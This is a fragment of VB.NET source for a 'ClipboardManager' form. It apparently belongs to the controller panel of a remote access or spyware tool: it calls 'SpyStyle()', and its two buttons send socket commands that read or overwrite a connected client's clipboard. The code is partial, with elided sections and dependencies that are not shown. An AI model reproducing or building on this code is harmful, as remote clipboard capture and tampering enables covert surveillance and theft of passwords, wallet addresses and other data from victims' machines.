Public Class ClipboardManager
     ...
     Private Sub ClipboardManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\20.ico")
         SpyStyle()
         Text = Title
    ...
    Private RectInputText0 As New List(Of Rectangle)
     Private Sub BTN_SET_Click(sender As Object, e As EventArgs) Handles BTN_SET.Click
         If Not classClient Is Nothing Then
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "set" & sockets.Data.SPL_DATA & BoxClipboard.Text, Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
    End Sub
     Private Sub BTN_GET_Click(sender As Object, e As EventArgs) Handles BTN_GET.Click
        If Not classClient Is Nothing Then
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getClipboard & sockets.Data.SPL_SOCKET & "get" & sockets.Data.SPL_DATA & "null", Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
    End Sub
End Class
